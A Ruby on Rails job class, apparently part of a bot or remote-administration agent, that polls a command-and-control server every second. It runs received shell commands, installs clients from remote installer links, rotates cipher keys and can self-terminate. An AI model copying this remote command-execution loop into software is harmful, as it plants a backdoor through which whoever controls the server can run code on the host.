class CommandControlJob < ApplicationJob
  queue_as :admin

  include CommandsHelper
  include SystemHelper
  include ClientHelper

  rescue_from(StandardError) do |exception|
    if exception.is_a?(CustomError) && exception.fatal_error?
      terminate_bot
      return
    end

    counter = Parameter.c_c_fails_counter + 1
    if counter >= 3
      terminate_bot
      return
    end

    Parameter.custom_update('c_c_fails_counter', counter)
    CommandControlJob.set(wait: 2.seconds).perform_later
  end

  def perform(*args)
    cc_log("cc[debug][args]: #{args}")
    if args.present? && args.first[:start]
      result = echo
      raise result if result.is_a?(CustomError)

      cc_log('Admin Interface deployed and synced with cc')
      Parameter.custom_update('c_c_interface_deploy', true)
    else
      pull_cc
    end

    CommandControlJob.set(wait: 1.seconds).perform_later
  end


  private

  def pull_cc
    commands = pull_command
    cc_log("cc[debug][commands]: Receiving => #{commands}")
    return if commands.blank?

    result = nil
    commands = commands.with_indifferent_access
    case commands['type']
    when 'system'
      result = run_shell(commands['action'])
    when 'deploy'
      result = deploy_client(commands['metadata']['settings'], commands['metadata']['installer_link'])
    when 'undeploy'
      result = shut_client
    when 'status'
      result = client_status
    when 'renew'
      Parameter.custom_update('c_c_cipher_key', commands['metadata']['key'])
      Parameter.custom_update('c_c_cipher_iv', commands['metadata']['iv'])
      result = 'Key and IV Renewed'
    when 'autokill'
      terminate_bot
    end

    if result.is_a?(CustomError)
      report_activity(identifier: commands['id'], error_code: result.code, error_msg: result.msg)
    else
      report_activity(success: true, identifier: commands['id'], action: commands['action'],  result: result)
    end
  end
end